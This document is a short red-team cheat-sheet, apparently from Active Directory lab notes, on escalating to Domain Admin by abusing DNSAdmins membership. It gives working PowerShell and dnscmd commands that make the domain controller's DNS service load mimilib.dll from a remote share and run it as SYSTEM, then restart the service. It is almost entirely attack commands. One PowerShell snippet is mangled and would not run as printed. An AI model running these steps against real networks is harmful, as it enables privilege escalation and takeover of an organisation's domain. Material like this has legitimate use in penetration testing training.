
# DNSAdmins

• It is possible for the members of the DNSAdmins group to load arbitrary DLL with the privileges of dns.exe (SYSTEM).
• In case the DC also serves as DNS, this will provide us escalation to DA. 
• Need privileges to restart the DNS service.

#### Enumerate the members of the DNSAdmis group
```powershell
Get-NetGroupMember -GroupName "DNSAdmins"

# AD Module
Get-ADGroupMember -Identity DNSAdmins
```

#### Configure DLL using dnscmd.exe (needs RSAT DNS):
```powershell
dnscmd dcorp-dc /config /serverlevelplugindll \\172.16.50.100\dll\mimilib.dll

# Using DNSServer module (needs RSAT DNS):
$dnsettings = Get-DnsServerSetting -ComputerName dcorp-dc - Verbose -All $dnsettings.ServerLevelPluginDll = "\\172.16.50.100\dll\mimilib.dll" Set-DnsServerSetting - InputObject 
$dnsettings -ComputerName dcorp-dc -Verbose
```

#### Restart the DNS service (assuming that the DNSAdmins group has the permission to do so): 
```cmd
sc \\dcorp-dc stop dns 
sc \\dcorp-dc start dns 
```

### By default, the mimilib.dll logs all DNS queries to `C:\Windows\System32\kiwidns.log`